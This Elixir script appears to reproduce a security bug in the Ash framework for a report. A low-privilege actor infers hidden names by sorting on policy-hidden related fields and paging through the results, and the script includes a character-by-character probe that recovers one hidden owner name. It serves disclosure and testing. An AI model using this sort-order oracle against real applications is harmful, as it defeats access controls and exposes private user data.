# Follow-ups: (1) aggregate load anomaly, (2) what an attacker recovers, (3) the opt-outs.
Code.require_file("setup.exs", __DIR__)
require Ash.Query
vsn = fn app -> Application.spec(app, :vsn) |> to_string() end
IO.puts("ash #{vsn.(:ash)}  ash_postgres #{vsn.(:ash_postgres)}  ash_sql #{vsn.(:ash_sql)}  flags=#{System.get_env("BUG_FLAGS", "0")}")
Setup.pg!()
Setup.seed!(Bug.Pg)
Setup.seed!(Bug.Ets)
{:ok, agent} = Agent.start_link(fn -> [] end)
:telemetry.attach("sql", [:bug, :repo, :query], fn _, _, meta, _ -> Agent.update(agent, &[meta.query | &1]) end, nil)
sql = fn fun -> Agent.update(agent, fn _ -> [] end); r = fun.(); {r, Agent.get(agent, &Enum.reverse/1)} end
member = %{role: :member}
admin = %{role: :admin}

IO.puts("\n== 1. member LOADS the first-aggregate over the read-policy-hidden assignee (expected for hidden users: nil)")
for {layer, task} <- [{"PG ", Bug.Pg.Task}, {"ETS", Bug.Ets.Task}], loads <- [[:assignee_name_agg], [:assignee_name_agg, :assignee_name_calc]] do
  {rows, qs} = sql.(fn -> task |> Ash.Query.load(loads) |> Ash.Query.sort(:id) |> Ash.Query.for_read(:read, %{}, actor: member) |> Ash.read!(actor: member) end)
  IO.puts("  #{layer} load #{inspect(loads)}: #{inspect(Enum.map(rows, &{&1.id, &1.assignee_name_agg}))}")
  for q <- qs, do: IO.puts("       SQL: #{q}")
end

IO.puts("  1b. member: sort_input([\"assignee.name\"]) AND load the aggregate (no calculation loaded)")
for {layer, task} <- [{"PG ", Bug.Pg.Task}, {"ETS", Bug.Ets.Task}] do
  {rows, qs} = sql.(fn -> task |> Ash.Query.load([:assignee_name_agg]) |> Ash.Query.sort_input(["assignee.name", "id"]) |> Ash.Query.for_read(:read, %{}, actor: member) |> Ash.read!(actor: member) end)
  IO.puts("  #{layer}: #{inspect(Enum.map(rows, &{&1.id, &1.assignee_name_agg}))}")
  for q <- qs, do: IO.puts("       SQL: #{q}")
  r = Enum.find(rows, &(&1.id == 3))
  IO.puts("       record 3 after the sorted read: calculations=#{inspect(r.calculations)} aggregates=#{inspect(r.aggregates)} metadata keys=#{inspect(Map.keys(r.__metadata__))}")
end

IO.puts("\n== 2. what a member learns (Postgres, action :paged, only sort_input + paging; no filter, no write)")
page = fn sort, opts -> Bug.Pg.Task |> Ash.Query.sort_input(sort) |> Ash.Query.for_read(:paged, %{}, actor: member) |> Ash.read!(actor: member, page: opts) end
IO.puts("  2a. total order of tasks by the hidden assignee name, one row per page (offset paging):")
order = for o <- 0..5, do: (page.(["assignee.name", "id"], limit: 1, offset: o).results |> hd() |> Map.get(:id))
IO.puts("      asc : #{inspect(order)}   (truth as admin: [2, 3, 4, 1, 6, 5])")
visible = Ash.read!(Bug.Pg.Task, actor: member, load: [:assignee]) |> Map.new(&{&1.id, &1.assignee && &1.assignee.name})
IO.puts("      names the member may read, in that order: #{inspect(Enum.map(order, &visible[&1]))}")
IO.puts("      => task 3's hidden assignee sorts between \"Alice\" and \"Carol\"; tasks 1 and 6 after \"Carol\"; 1 before 6.")
IO.puts("  2b. same for the field-policy-hidden owner name:")
order = for o <- 0..5, do: (page.(["owner.name", "id"], limit: 1, offset: o).results |> hd() |> Map.get(:id))
IO.puts("      asc : #{inspect(order)}   (truth as admin: [2, 3, 4, 1, 6, 5]; the member reads no owner name at all)")
IO.puts("  2c. equality of hidden values: groups of tasks with the same hidden owner are adjacent (not shown; follows from 2b).")
IO.puts("  2d. keyset cursor of the page sorted by the hidden related field (does it carry the value?):")
p = page.(["owner.name", "id"], limit: 2)
for r <- p.results do
  ks = r.__metadata__[:keyset]
  IO.puts("      task #{r.id}: keyset decodes to #{inspect(ks && (ks |> Base.decode64!() |> :erlang.binary_to_term([:safe])))}")
end
p = page.(["assignee.name", "id"], limit: 3)
for r <- p.results do
  ks = r.__metadata__[:keyset]
  IO.puts("      task #{r.id} (assignee path): keyset decodes to #{inspect(ks && (ks |> Base.decode64!() |> :erlang.binary_to_term([:safe])))}")
end

IO.puts("  2e. chosen-probe recovery, ONLY IF the attacker can also create a task pointing at a person/user whose name they chose.")
IO.puts("      Here: as admin (standing in for such a write path) we add probe people; the member then only sorts.")
hidden_task = 3
alphabet = Enum.map(?A..?Z, &<<&1>>) ++ Enum.map(?a..?z, &<<&1>>)
# Postgres default collation matters for the comparison; use the same ORDER BY the server uses.
recovered =
  Enum.reduce_while(1..6, "", fn _, prefix ->
    # find the largest candidate c such that prefix<>c sorts <= hidden name
    next =
      Enum.reduce_while(alphabet, nil, fn c, best ->
        probe = prefix <> c
        Bug.Repo.query!("DELETE FROM tasks WHERE id = 900")
        Bug.Repo.query!("DELETE FROM people WHERE id = 900")
        Ash.create!(Bug.Pg.Person, %{id: 900, name: probe}, actor: admin)
        Ash.create!(Bug.Pg.Task, %{id: 900, title: "probe", owner_id: 900}, actor: admin)
        ids = page.(["owner.name", "-id"], limit: 50, offset: 0).results |> Enum.map(& &1.id)
        # "-id": on a tie the probe (id 900) comes first, so probe-before-hidden <=> probe <= hidden
        if Enum.find_index(ids, &(&1 == 900)) < Enum.find_index(ids, &(&1 == hidden_task)), do: {:cont, c}, else: {:halt, best}
      end)
    if next, do: {:cont, prefix <> next}, else: {:halt, prefix}
  end)
Bug.Repo.query!("DELETE FROM tasks WHERE id = 900")
Bug.Repo.query!("DELETE FROM people WHERE id = 900")
IO.puts("      recovered owner name of task #{hidden_task}: #{inspect(recovered)}   (truth: \"Bea\")")

IO.puts("\n== 3. opt-outs (ETS resources defined here)")
defmodule X.Domain do
  use Ash.Domain, validate_config_inclusion?: false
  resources do
    allow_unregistered? true
  end
end
defmodule X.User do
  use Ash.Resource, domain: X.Domain, data_layer: Ash.DataLayer.Ets
  actions do
    defaults [:read]
  end
  attributes do
    attribute :id, :integer, primary_key?: true, allow_nil?: false, public?: true
    attribute :name, :string, public?: true
    attribute :nick, :string, public?: true, sortable?: false
    attribute :priv, :string, public?: false
  end
end
defmodule X.Task do
  use Ash.Resource, domain: X.Domain, data_layer: Ash.DataLayer.Ets
  actions do
    defaults [:read]
  end
  attributes do
    attribute :id, :integer, primary_key?: true, allow_nil?: false, public?: true
    attribute :a_id, :integer, public?: true
  end
  relationships do
    belongs_to :default_rel, X.User, public?: true, define_attribute?: false, source_attribute: :a_id
    belongs_to :unsortable_rel, X.User, public?: true, define_attribute?: false, source_attribute: :a_id, sortable?: false
    belongs_to :private_rel, X.User, define_attribute?: false, source_attribute: :a_id
    has_many :many_rel, X.User, public?: true, destination_attribute: :id, source_attribute: :a_id
  end
end
IO.puts("  relationship defaults: " <> inspect(for r <- Ash.Resource.Info.relationships(X.Task), do: {r.name, public?: r.public?, sortable?: r.sortable?, filterable?: r.filterable?}))
for s <- ["default_rel.name", "default_rel.nick", "default_rel.priv", "unsortable_rel.name", "private_rel.name", "many_rel.name", "default_rel.id"] do
  q = Ash.Query.sort_input(X.Task, [s])
  IO.puts("  sort_input([#{inspect(s)}]) -> " <> if(q.valid?, do: "ACCEPTED", else: "rejected: " <> (q.errors |> hd() |> Exception.message() |> String.replace("\n", " "))))
end
